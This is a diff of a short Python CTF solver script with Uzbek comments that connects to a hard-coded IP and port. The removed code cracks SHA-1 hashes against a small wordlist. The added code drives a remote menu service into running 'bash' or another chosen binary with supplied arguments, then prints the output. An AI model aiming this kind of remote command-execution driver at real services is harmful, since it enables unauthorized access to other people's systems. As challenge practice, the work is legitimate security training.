@@ -1,87 +1,70 @@
-# speedrun.py
-
 import socket
-import re
 import time
-import hashlib
 
-HOST = "154.57.164.81"
-PORT = 30415
+HOST = "154.57.164.81"   # remote bo‘lsa o‘zgartirasan
+PORT = 30415          # portni moslashtir
 
-# oddiy wordlist (kengaytirsa bo‘ladi)
-WORDLIST = [
-    "hello", "world", "test", "admin", "password",
-    "123456", "qwerty", "flag", "ctf", "secret"
-]
-
-def recv(sock, timeout=3):
-    sock.setblocking(0)
+def recv_until(sock, delim=b"> "):
     data = b""
-    start = time.time()
-
-    while True:
-        if time.time() - start > timeout:
+    while delim not in data:
+        chunk = sock.recv(1024)
+        if not chunk:
             break
-        try:
-            part = sock.recv(4096)
-            if part:
-                data += part
-                start = time.time()
-        except:
-            pass
+        data += chunk
+    return data
 
-    return data.decode(errors="ignore")
-
-
-def find_hash(text):
-    return re.findall(r"\b[a-f0-9]{40}\b", text)
-
-
-def crack_sha1(hash_value):
-    for word in WORDLIST:
-        if hashlib.sha1(word.encode()).hexdigest() == hash_value:
-            return word
-    return None
-
+def sendline(sock, data):
+    if isinstance(data, str):
+        data = data.encode()
+    sock.sendall(data + b"\n")
 
 def main():
-    print(f"🔌 Connecting to {HOST}:{PORT}")
+    s = socket.socket()
+    s.connect((HOST, PORT))
 
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.settimeout(5)
-        s.connect((HOST, PORT))
+    # banner skip
+    print(recv_until(s).decode(errors="ignore"))
 
+    # 1. mode
+    sendline(s, "1")
+    time.sleep(0.2)
+    recv_until(s)
+    sendline(s, "1")
+
+    # 2. bin
+    time.sleep(0.2)
+    sendline(s, "2")
+    recv_until(s)
+    sendline(s, "bash")   # yoki sh, ls va hokazo
+
+    # 3. args
+    time.sleep(0.2)
+    sendline(s, "3")
+    recv_until(s)
+    sendline(s, "a,b")
+
+    # 4. switches
+    time.sleep(0.2)
+    sendline(s, "4")
+    recv_until(s)
+    sendline(s, "c,d")
+
+    # 5. trigger
+    time.sleep(0.2)
+    sendline(s, "5")
+
+    # natijani olish
+    time.sleep(0.5)
+    try:
         while True:
-            data = recv(s, timeout=5)
+            data = s.recv(4096)
             if not data:
                 break
+            print(data.decode(errors="ignore"), end="")
+    except:
+        pass
 
-            print("📥", data)
-
-            hashes = find_hash(data)
-
-            if hashes:
-                for h in hashes:
-                    print(f"🔍 Found hash: {h}")
-
-                    # 1. Avval crack qilib ko‘ramiz
-                    cracked = crack_sha1(h)
-
-                    if cracked:
-                        print(f"🔓 Cracked: {cracked}")
-                        s.sendall((cracked + "\n").encode())
-                    else:
-                        # 2. Bo‘lmasa echo qilib yuboramiz
-                        print(f"📤 Sending raw hash")
-                        s.sendall((h + "\n").encode())
-            else:
-                # fallback
-                s.sendall(b"\n")
-
-            if "flag" in data.lower():
-                print("🏁 FLAG FOUND!")
-                break
-
+    s.close()
 
 if __name__ == "__main__":
     main()
